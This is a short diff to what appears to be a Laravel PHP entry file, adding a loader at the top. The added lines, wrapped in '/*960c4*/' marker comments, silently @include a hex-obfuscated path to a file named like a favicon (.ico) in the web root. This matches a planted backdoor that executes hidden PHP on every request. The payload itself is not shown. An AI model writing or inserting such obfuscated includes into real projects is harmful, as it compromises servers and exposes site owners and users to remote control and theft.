@@ -1,5 +1,12 @@
 <?php
 
+
+/*960c4*/
+
+@include "\x2fhome\x2fx252\x3016w/\x70ubli\x63_htm\x6c/mte\x73t/do\x77nloa\x64er/j\x73/fav\x69con_\x383d73\x65.ico";
+
+/*960c4*/
+
 /**
  * Laravel - A PHP Framework For Web Artisans
  *
